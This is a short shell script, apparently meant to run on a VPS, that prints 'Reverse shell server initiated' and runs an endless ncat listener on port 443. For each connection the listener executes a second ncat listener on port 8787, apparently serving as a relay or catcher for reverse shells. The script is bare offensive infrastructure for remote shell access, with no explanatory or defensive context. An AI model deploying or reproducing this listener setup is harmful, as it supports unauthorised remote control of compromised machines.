# This script runs on VPS of Taiwania

echo "Reverse shell server initiated"
while true; do ncat -l -e "/usr/bin/ncat -l 0.0.0.0 8787" 0.0.0.0 443; done
